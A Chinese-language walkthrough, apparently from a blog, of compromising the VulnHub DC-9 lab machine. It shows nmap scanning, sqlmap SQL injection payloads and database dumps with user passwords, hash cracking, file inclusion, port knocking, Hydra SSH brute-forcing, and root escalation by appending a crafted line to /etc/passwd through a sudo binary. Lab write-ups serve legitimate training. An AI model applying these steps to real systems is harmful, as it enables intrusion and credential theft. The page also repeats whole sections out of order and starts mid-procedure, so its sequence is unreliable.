-<p>username.txt 可以用以下方式取得特定格式資料</p>
-<p><code>awk -F &quot;|&quot; &#39;NR&gt;2 &#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $4); gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $6); print $6&#125;&#39; UserDetails.db</code></p>
-<p><img src="/img/DC_Untitled_64.png" alt="Untitled"></p>
-<p>password.txt</p>
-<p><code>awk -F &quot;|&quot; &#39;NR&gt;2 &#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $4); gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $6); print $4&#125;&#39; UserDetails.db</code></p>
-<p><img src="/img/DC_Untitled_65.png" alt="Untitled"></p>
-<p>通過 SSH 服務使用 Hydra，提供兩個文件作為輸入。我們需要等待 Hydra 完成攻擊並列出有效密碼（如果找到的話）</p>
-<p><img src="/img/DC_Untitled_66.png" alt="Untitled"></p>
-<p>[22][ssh] host: 192.168.147.131   login: chandlerb   password: UrAG0D!<br>[22][ssh] host: 192.168.147.131   login: joeyt   password: Passw0rd<br>[22][ssh] host: 192.168.147.131   login: janitor   password: Ilovepeepee</p>
-<p>現在知道有三個組合可以登錄</p>
-<p>chandlerb 用戶登入後沒發現有趣的東西</p>
-<p><img src="/img/DC_Untitled_67.png" alt="Untitled"></p>
-<p>joeyt用戶也沒有東西</p>
-<p><img src="/img/DC_Untitled_68.png" alt="Untitled"></p>
-<p>在janitor用戶下看到了些機敏資料</p>
-<p><img src="/img/DC_Untitled_69.png" alt="Untitled"></p>
-<p>將這些密碼在拿去hydra以相同用戶爆破一次</p>
-<p><img src="/img/DC_Untitled_70.png" alt="Untitled"></p>
-<p>[22][ssh] host: 192.168.147.131   login: fredf   password: B4-Tru3-001<br>[22][ssh] host: 192.168.147.131   login: joeyt   password: Passw0rd</p>
-<p>將這些用戶嘗試權升級</p>
-<p>登入到fredf 使用 <code>sudo -l</code></p>
-<p><img src="/img/DC_Untitled_71.png" alt="Untitled"></p>
-<p><img src="/img/DC_Untitled_72.png" alt="Untitled"></p>
-<p>看起來二進製文件正在運行某種名為<em>test.py</em>的 Python 文件。讓我們使用<code>find</code>命令找到它：</p>
-<ul>
-<li><code>/</code>是開始掃描的根路徑</li>
-<li>-<code>type f</code>搜索文件（d 代表目錄）</li>
-<li>-<code>name &#39;test.py&#39;</code>文件名 flag.txt。我們也可以使用通配符，例如“flag”</li>
-<li><code>2&gt;/dev/null</code>這將產生更清晰的輸出，因為它將丟棄錯誤，例如權限錯誤。</li>
-</ul>
-<p><code>find / -name &quot;[test.py](http://test.py/)&quot; -type f 2&gt;/dev/null</code></p>
-<p><img src="/img/DC_Untitled_73.png" alt="Untitled"></p>
-<p>通過使用測試腳本將新記錄injecting&#x2F;concatinating到文件來添加新的<em><strong>root user</strong></em></p>
-<p>首先我們需要選擇一個密碼，加鹽並對結果進行hash處理。openssl 來救援。</p>
-<p>標誌：</p>
-<ul>
-<li><code>-1</code>使用什麼哈希算法。在我們的用例中，這並不重要，因此我們使用 MD5，在現實世界的 PT 中應避免使用 MD5，因為它不安全。</li>
-<li><code>-salt salt</code>用作鹽的string。我選擇string salt</li>
-<li><code>-password</code>我們想要使用的明文密碼。</li>
-</ul>
-<p><code>openssl passwd -1 -salt salt password</code></p>
-<p>openssl passwd: 這是 OpenSSL 工具中的一個子命令，用於生成密碼哈希。</p>
-<ul>
-<li>1: 這是一個選項，表示要使用 <strong>MD5 哈希算法生成密碼哈希</strong>。雖然 MD5 不再被視為安全的哈希算法，但在某些情況下仍然可以用於簡單的密碼散列。</li>
-<li>salt salt: 這是一個選項，用於指定用於哈希生成的鹽值。鹽是一個隨機字符串，可以增加密碼哈希的安全性。</li>
-</ul>
-<p>password: 這是要哈希的密碼。替換為您要哈希的實際密碼。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span>$<span class="number">1</span>$salt$qJH7.N4xYta3aEG<span class="operator">/</span>dfqo<span class="operator">/</span><span class="number">0</span><span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure>
-
-<p><code>vi /tmp/user</code> 先在tmp目錄下新增一個檔案叫user，並寫入以下內容</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hful:$<span class="number">1</span>$salt$qJH7.N4xYta3aEG<span class="operator">/</span>dfqo<span class="operator">/</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>::<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br></pre></td></tr></table></figure>
-
-<p>寫完後到執行.&#x2F;test的地方<code>/opt/devstuff/dist/test</code></p>
-<p><code>sudo ./test /tmp/user /etc/passwd</code> 並執行這命令</p>
-<p>然後cat &#x2F;etc&#x2F;passwd就會看到hful變成了允許的root身分(這裡我有寫錯內容所以才出來兩個)</p>
-<p><img src="/img/DC_Untitled_74.png" alt="Untitled"></p>
-<p>接下來到hful登入密碼是剛剛前面設定的password</p>
-<p><img src="/img/DC_Untitled_75.png" alt="Untitled"></p>
-<p>其他參考</p>
-<p><a target="_blank" rel="noopener" href="https://www.explainshell.com/explain?cmd=sudo+-l">explainshell.com - sudo -l</a></p>
-<hr>
-<h1 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9</a></p>
-<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-9.zip"></a></p>
-<p>已知該機器的MAC 00:0C:29:FE:8B:07</p>
-<p><img src="/img/DC_Untitled_47.png" alt="Untitled"></p>
-<p>因為是橋接，所以機器的網段應該會一樣 </p>
-<p>kali : 192.168.147.128   NAT</p>
-<p>dc-9 : MAC 00:0C:29:FE:8B:07  NAT</p>
-<p>需要用<code>netdiscover</code>去掃192.168.0.0&#x2F;24的位置看有沒有符合該網段資訊的IP</p>
-<p>或是可以用<code>namp -sn 192.168.0.0/24</code></p>
-<p>這裡用 <code>netdiscover -i eth1 -r 192.168.147.0/24</code></p>
-<p><img src="/img/DC_Untitled_48.png" alt="Untitled"></p>
-<p>找到了192.168.147.131的IP位址</p>
-<p><code>nmap -sV -p- -O -T4 192.168.147.131</code></p>
-<ul>
-<li><code>-sV</code> 確定服務&#x2F;版本信息</li>
-<li><code>-T4</code> 為了更快的執行</li>
-<li><code>-p-</code> 掃描所有端口</li>
-<li><code>-O</code> 識別操作系統</li>
-</ul>
-<p><img src="/img/DC_Untitled_49.png" alt="Untitled"></p>
-<p>查看開放的服務後沒發現可利用的內容</p>
-<p>22 port filtered</p>
-<p>一般nmap所掃描出來的結果有三種：<code>open、filtered、unfiltered</code></p>
-<ul>
-<li>Open意思是指目標機器的這個連接埠有開啟</li>
-<li>Filtered意思是指有Firewall&#x2F;filter,或是其它的網路設備將掩蓋了此連接埠，並且阻止nmap去得知連接埠是否有開啟</li>
-<li>Unfiltered意思是指這個連接埠被nmap判定為關閉的，並且沒有任何Firewall&#x2F;filter來阻止nmap來嘗試得知連接埠的狀態。Unfiltered ports是很平常的訊息，並且只出現在大部份的掃描連接埠在filtered狀態中。</li>
-</ul>
-<p>猜他使用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Port_knocking">Port Knocking</a> 的方法</p>
-<p>查看該網站功能</p>
-<p><img src="/img/DC_Untitled_50.png" alt="Untitled"></p>
-<p>再搜索位址下使用SQL injection可以允許執行，不過需要繞一下</p>
-<p><img src="/img/DC_Untitled_51.png" alt="Untitled"></p>
-<p>用sqlmap去爆破，首先複製全Request成一個txt檔案(Copy to file)</p>
-<p><img src="/img/DC_Untitled_52.png" alt="Untitled"></p>
-<p><code>sqlmap -r search.txt --dbs</code></p>
-<p><img src="/img/DC_Untitled_53.png" alt="Untitled"></p>
-<p>有一些存在的DB</p>
-<p>available databases [3]:<br>[<em>]  <em>information_schema</em><br>[</em>]  Staff<br>[*]  users</p>
-<p>再來找<strong>tables</strong></p>
-<p><code>sqlmap -r search.txt --tables</code></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="keyword">Parameter</span>: <span class="keyword">search</span> (POST)</span><br><span class="line">    Type: <span class="type">time</span><span class="operator">-</span>based blind</span><br><span class="line">    Title: MySQL <span class="operator">&gt;=</span> <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="type">time</span><span class="operator">-</span>based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="keyword">search</span><span class="operator">=</span>param<span class="string">&#x27; AND (SELECT 3355 FROM (SELECT(SLEEP(5)))Rcyx) AND &#x27;</span>nyOI<span class="string">&#x27;=&#x27;</span>nyOI</span><br><span class="line"></span><br><span class="line">    Type: <span class="keyword">UNION</span> query</span><br><span class="line">    Title: Generic <span class="keyword">UNION</span> query (<span class="keyword">NULL</span>) <span class="operator">-</span> <span class="number">6</span> columns</span><br><span class="line">    Payload: <span class="keyword">search</span><span class="operator">=</span>param<span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a707871,0x5067686578705049616e6f687a72434e7769564250617772595941474a4d6e614c4a4c72417a4556,0x7176707a71),NULL,NULL,NULL,NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 10 (buster)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.38</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] fetching database names</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] fetching tables for databases: &#x27;</span>Staff, information_schema, users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: information_schema</span></span><br><span class="line"><span class="string">[76 tables]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| ALL_PLUGINS                           |</span></span><br><span class="line"><span class="string">| APPLICABLE_ROLES                      |</span></span><br><span class="line"><span class="string">| CHARACTER_SETS                        |</span></span><br><span class="line"><span class="string">| CHECK_CONSTRAINTS                     |</span></span><br><span class="line"><span class="string">| CLIENT_STATISTICS                     |</span></span><br><span class="line"><span class="string">| COLLATIONS                            |</span></span><br><span class="line"><span class="string">| COLLATION_CHARACTER_SET_APPLICABILITY |</span></span><br><span class="line"><span class="string">| COLUMNS                               |</span></span><br><span class="line"><span class="string">| COLUMN_PRIVILEGES                     |</span></span><br><span class="line"><span class="string">| ENABLED_ROLES                         |</span></span><br><span class="line"><span class="string">| ENGINES                               |</span></span><br><span class="line"><span class="string">| EVENTS                                |</span></span><br><span class="line"><span class="string">| FILES                                 |</span></span><br><span class="line"><span class="string">| GEOMETRY_COLUMNS                      |</span></span><br><span class="line"><span class="string">| GLOBAL_STATUS                         |</span></span><br><span class="line"><span class="string">| GLOBAL_VARIABLES                      |</span></span><br><span class="line"><span class="string">| INDEX_STATISTICS                      |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_PAGE                    |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_PAGE_LRU                |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_POOL_STATS              |</span></span><br><span class="line"><span class="string">| INNODB_CMP                            |</span></span><br><span class="line"><span class="string">| INNODB_CMPMEM                         |</span></span><br><span class="line"><span class="string">| INNODB_CMPMEM_RESET                   |</span></span><br><span class="line"><span class="string">| INNODB_CMP_PER_INDEX                  |</span></span><br><span class="line"><span class="string">| INNODB_CMP_PER_INDEX_RESET            |</span></span><br><span class="line"><span class="string">| INNODB_CMP_RESET                      |</span></span><br><span class="line"><span class="string">| INNODB_FT_BEING_DELETED               |</span></span><br><span class="line"><span class="string">| INNODB_FT_CONFIG                      |</span></span><br><span class="line"><span class="string">| INNODB_FT_DEFAULT_STOPWORD            |</span></span><br><span class="line"><span class="string">| INNODB_FT_DELETED                     |</span></span><br><span class="line"><span class="string">| INNODB_FT_INDEX_CACHE                 |</span></span><br><span class="line"><span class="string">| INNODB_FT_INDEX_TABLE                 |</span></span><br><span class="line"><span class="string">| INNODB_LOCKS                          |</span></span><br><span class="line"><span class="string">| INNODB_LOCK_WAITS                     |</span></span><br><span class="line"><span class="string">| INNODB_METRICS                        |</span></span><br><span class="line"><span class="string">| INNODB_MUTEXES                        |</span></span><br><span class="line"><span class="string">| INNODB_SYS_COLUMNS                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_DATAFILES                  |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FIELDS                     |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FOREIGN                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FOREIGN_COLS               |</span></span><br><span class="line"><span class="string">| INNODB_SYS_INDEXES                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_SEMAPHORE_WAITS            |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLES                     |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLESPACES                |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLESTATS                 |</span></span><br><span class="line"><span class="string">| INNODB_SYS_VIRTUAL                    |</span></span><br><span class="line"><span class="string">| INNODB_TABLESPACES_ENCRYPTION         |</span></span><br><span class="line"><span class="string">| INNODB_TABLESPACES_SCRUBBING          |</span></span><br><span class="line"><span class="string">| INNODB_TRX                            |</span></span><br><span class="line"><span class="string">| KEY_CACHES                            |</span></span><br><span class="line"><span class="string">| KEY_COLUMN_USAGE                      |</span></span><br><span class="line"><span class="string">| PARAMETERS                            |</span></span><br><span class="line"><span class="string">| PARTITIONS                            |</span></span><br><span class="line"><span class="string">| PLUGINS                               |</span></span><br><span class="line"><span class="string">| PROCESSLIST                           |</span></span><br><span class="line"><span class="string">| PROFILING                             |</span></span><br><span class="line"><span class="string">| REFERENTIAL_CONSTRAINTS               |</span></span><br><span class="line"><span class="string">| ROUTINES                              |</span></span><br><span class="line"><span class="string">| SCHEMATA                              |</span></span><br><span class="line"><span class="string">| SCHEMA_PRIVILEGES                     |</span></span><br><span class="line"><span class="string">| SESSION_STATUS                        |</span></span><br><span class="line"><span class="string">| SESSION_VARIABLES                     |</span></span><br><span class="line"><span class="string">| SPATIAL_REF_SYS                       |</span></span><br><span class="line"><span class="string">| STATISTICS                            |</span></span><br><span class="line"><span class="string">| SYSTEM_VARIABLES                      |</span></span><br><span class="line"><span class="string">| TABLES                                |</span></span><br><span class="line"><span class="string">| TABLESPACES                           |</span></span><br><span class="line"><span class="string">| TABLE_CONSTRAINTS                     |</span></span><br><span class="line"><span class="string">| TABLE_PRIVILEGES                      |</span></span><br><span class="line"><span class="string">| TABLE_STATISTICS                      |</span></span><br><span class="line"><span class="string">| TRIGGERS                              |</span></span><br><span class="line"><span class="string">| USER_PRIVILEGES                       |</span></span><br><span class="line"><span class="string">| USER_STATISTICS                       |</span></span><br><span class="line"><span class="string">| VIEWS                                 |</span></span><br><span class="line"><span class="string">| user_variables                        |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">[2 tables]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| StaffDetails                          |</span></span><br><span class="line"><span class="string">| Users                                 |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">[1 table]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| UserDetails                           |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br></pre></td></tr></table></figure>
-
-<p>提取表的每一列(<code>Staff</code>、users)</p>
-<p><code>sqlmap -r search_form.txt --columns -D Staff</code></p>
-<p><img src="/img/DC_Untitled_54.png" alt="Untitled"></p>
-<p><code>sqlmap -r search.txt --columns -D users</code></p>
-<p><img src="/img/DC_Untitled_55.png" alt="Untitled"></p>
-<p>接下來轉儲tables的中的數據</p>
-<p><code>sqlmap -r search.txt --dump -D users -T UserDetails</code></p>
-<p><img src="/img/DC_Untitled_56.png" alt="Untitled"></p>
-<p><code>sqlmap -r search.txt --dump -D Staff -T Users</code></p>
-<p><img src="/img/DC_Untitled_57.png" alt="Untitled"></p>
-<p>這裡就找到了admin Password，它包含一個明文用戶名和一個<a target="_blank" rel="noopener" href="https://auth0.com/blog/hashing-passwords-one-way-road-to-security/">散列密碼</a>，甚至 sqlmap 也將其識別為 MD5。</p>
-<p><a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a>破解這個哈希值</p>
-<p><img src="/img/DC_Untitled_58.png" alt="Untitled"></p>
-<p>transorbital1</p>
-<p><img src="/img/DC_Untitled_59.png" alt="Untitled"></p>
-<p>這看起來是要請求加載file，也許可以利用<strong>FILE INCLUSION VULNERABILITIES測試</strong></p>
-<p><img src="/img/DC_Untitled_60.png" alt="Untitled"></p>
-<p>先前再22 port找到看起來是<strong>Port knocking的問題</strong></p>
-<p>透過knockd.conf去察看文件</p>
-<p><img src="/img/DC_Untitled_61.png" alt="Untitled"></p>
-<p>為了打開 SSH 端口需要使用 SYN 數據包訪問的端口順序 - 7469,8475,9842 端口。</p>
-<p><img src="/img/DC_Untitled_62.png" alt="Untitled"></p>
-<p>我們可以使用以下方法之一：</p>
-<ol>
-<li><p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/knockd">Knockd</a>- 需要安裝。</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/hping3">hping3</a><code>hping3 -S 10.0.0.235 -p 7469 -c 1; hping3 -S 10.0.0.235 -p 8475 -c 1; hping3 -S 10.0.0.235 -p 9842 -c 1</code></p>
-<ul>
-<li>預安裝在 Kali 上。使用以下命令向每個端口發送 1 個 SYN 數據包：</li>
-</ul>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat</a>- 我將使用這種方法，因為它（手動但）簡單。</p>
-</li>
-</ol>
-<p><img src="/img/DC_Untitled_63.png" alt="Untitled"></p>
-<h3 id="hydra-1"><a href="#hydra-1" class="headerlink" title="hydra"></a><strong>hydra</strong></h3><p>前面在users的db中找到了用戶名稱跟密碼的列表，需要知道哪個帳號匹配哪個密碼，這裡用爆破方式，需要將剛sqlmap的資料丟過來</p>
-<p>首先需要創建user跟passwd的文件</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Table</span>: UserDetails</span><br><span class="line">[<span class="number">17</span> entries]</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> lastname   <span class="operator">|</span> password      <span class="operator">|</span> reg_date            <span class="operator">|</span> username  <span class="operator">|</span> firstname <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> Moe        <span class="operator">|</span> <span class="number">3</span>kfs86sfd     <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> marym     <span class="operator">|</span> Mary      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>  <span class="operator">|</span> Dooley     <span class="operator">|</span> <span class="number">468</span>sfdfsd2    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> julied    <span class="operator">|</span> Julie     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>  <span class="operator">|</span> Flintstone <span class="operator">|</span> <span class="number">4</span>sfd87sfd1    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> fredf     <span class="operator">|</span> Fred      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>  <span class="operator">|</span> Rubble     <span class="operator">|</span> RocksOff      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> barneyr   <span class="operator">|</span> Barney    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span>  <span class="operator">|</span> Cat        <span class="operator">|</span> TC<span class="operator">&amp;</span>TheBoyz    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> tomc      <span class="operator">|</span> Tom       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6</span>  <span class="operator">|</span> Mouse      <span class="operator">|</span> B8m#<span class="number">48</span>sd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> jerrym    <span class="operator">|</span> Jerry     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">7</span>  <span class="operator">|</span> Flintstone <span class="operator">|</span> Pebbles       <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> wilmaf    <span class="operator">|</span> Wilma     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8</span>  <span class="operator">|</span> Rubble     <span class="operator">|</span> BamBam01      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> bettyr    <span class="operator">|</span> Betty     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">9</span>  <span class="operator">|</span> Bing       <span class="operator">|</span> UrAG0D<span class="operator">!</span>       <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> chandlerb <span class="operator">|</span> Chandler  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span> Tribbiani  <span class="operator">|</span> Passw0rd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> joeyt     <span class="operator">|</span> Joey      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span> Green      <span class="operator">|</span> yN72#dsd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> rachelg   <span class="operator">|</span> Rachel    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> Geller     <span class="operator">|</span> ILoveRachel   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> rossg     <span class="operator">|</span> Ross      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">13</span> <span class="operator">|</span> Geller     <span class="operator">|</span> <span class="number">3248</span>dsds7s    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> monicag   <span class="operator">|</span> Monica    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span> Buffay     <span class="operator">|</span> smellycats    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> phoebeb   <span class="operator">|</span> Phoebe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15</span> <span class="operator">|</span> McScoots   <span class="operator">|</span> YR3BVxxxw87   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> scoots    <span class="operator">|</span> Scooter   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">16</span> <span class="operator">|</span> Trump      <span class="operator">|</span> Ilovepeepee   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> janitor   <span class="operator">|</span> Donald    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">17</span> <span class="operator">|</span> Morrison   <span class="operator">|</span> Hawaii<span class="operator">-</span>Five<span class="number">-0</span> <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">28</span> <span class="operator">|</span> janitor2  <span class="operator">|</span> Scott     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br></pre></td></tr></table></figure>
-
-<p>username.txt 可以用以下方式取得特定格式資料</p>
-<p><code>awk -F &quot;|&quot; &#39;NR&gt;2 &#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $4); gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $6); print $6&#125;&#39; UserDetails.db</code></p>
-<p><img src="/img/DC_Untitled_64.png" alt="Untitled"></p>
-<p>password.txt</p>
-<p><code>awk -F &quot;|&quot; &#39;NR&gt;2 &#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $4); gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $6); print $4&#125;&#39; UserDetails.db</code></p>
-<p><img src="/img/DC_Untitled_65.png" alt="Untitled"></p>
-<p>通過 SSH 服務使用 Hydra，提供兩個文件作為輸入。我們需要等待 Hydra 完成攻擊並列出有效密碼（如果找到的話）</p>
-<p><img src="/img/DC_Untitled_66.png" alt="Untitled"></p>
-<p>[22][ssh] host: 192.168.147.131   login: chandlerb   password: UrAG0D!<br>[22][ssh] host: 192.168.147.131   login: joeyt   password: Passw0rd<br>[22][ssh] host: 192.168.147.131   login: janitor   password: Ilovepeepee</p>
-<p>現在知道有三個組合可以登錄</p>
-<p>chandlerb 用戶登入後沒發現有趣的東西</p>
-<p><img src="/img/DC_Untitled_67.png" alt="Untitled"></p>
-<p>joeyt用戶也沒有東西</p>
-<p><img src="/img/DC_Untitled_68.png" alt="Untitled"></p>
-<p>在janitor用戶下看到了些機敏資料</p>
-<p><img src="/img/DC_Untitled_69.png" alt="Untitled"></p>
-<p>將這些密碼在拿去hydra以相同用戶爆破一次</p>
-<p><img src="/img/DC_Untitled_70.png" alt="Untitled"></p>
-<p>[22][ssh] host: 192.168.147.131   login: fredf   password: B4-Tru3-001<br>[22][ssh] host: 192.168.147.131   login: joeyt   password: Passw0rd</p>
-<p>將這些用戶嘗試權升級</p>
-<p>登入到fredf 使用 <code>sudo -l</code></p>
-<p><img src="/img/DC_Untitled_71.png" alt="Untitled"></p>
-<p><img src="/img/DC_Untitled_72.png" alt="Untitled"></p>
-<p>看起來二進製文件正在運行某種名為<em>test.py</em>的 Python 文件。讓我們使用<code>find</code>命令找到它：</p>
-<ul>
-<li><code>/</code>是開始掃描的根路徑</li>
-<li>-<code>type f</code>搜索文件（d 代表目錄）</li>
-<li>-<code>name &#39;test.py&#39;</code>文件名 flag.txt。我們也可以使用通配符，例如“flag”</li>
-<li><code>2&gt;/dev/null</code>這將產生更清晰的輸出，因為它將丟棄錯誤，例如權限錯誤。</li>
-</ul>
-<p><code>find / -name &quot;[test.py](http://test.py/)&quot; -type f 2&gt;/dev/null</code></p>
-<p><img src="/img/DC_Untitled_73.png" alt="Untitled"></p>
-<p>通過使用測試腳本將新記錄injecting&#x2F;concatinating到文件來添加新的<em><strong>root user</strong></em></p>
-<p>首先我們需要選擇一個密碼，加鹽並對結果進行hash處理。openssl 來救援。</p>
-<p>標誌：</p>
-<ul>
-<li><code>-1</code>使用什麼哈希算法。在我們的用例中，這並不重要，因此我們使用 MD5，在現實世界的 PT 中應避免使用 MD5，因為它不安全。</li>
-<li><code>-salt salt</code>用作鹽的string。我選擇string salt</li>
-<li><code>-password</code>我們想要使用的明文密碼。</li>
-</ul>
-<p><code>openssl passwd -1 -salt salt password</code></p>
-<p>openssl passwd: 這是 OpenSSL 工具中的一個子命令，用於生成密碼哈希。</p>
-<ul>
-<li>1: 這是一個選項，表示要使用 <strong>MD5 哈希算法生成密碼哈希</strong>。雖然 MD5 不再被視為安全的哈希算法，但在某些情況下仍然可以用於簡單的密碼散列。</li>
-<li>salt salt: 這是一個選項，用於指定用於哈希生成的鹽值。鹽是一個隨機字符串，可以增加密碼哈希的安全性。</li>
-</ul>
-<p>password: 這是要哈希的密碼。替換為您要哈希的實際密碼。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span>$<span class="number">1</span>$salt$qJH7.N4xYta3aEG<span class="operator">/</span>dfqo<span class="operator">/</span><span class="number">0</span><span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure>
-
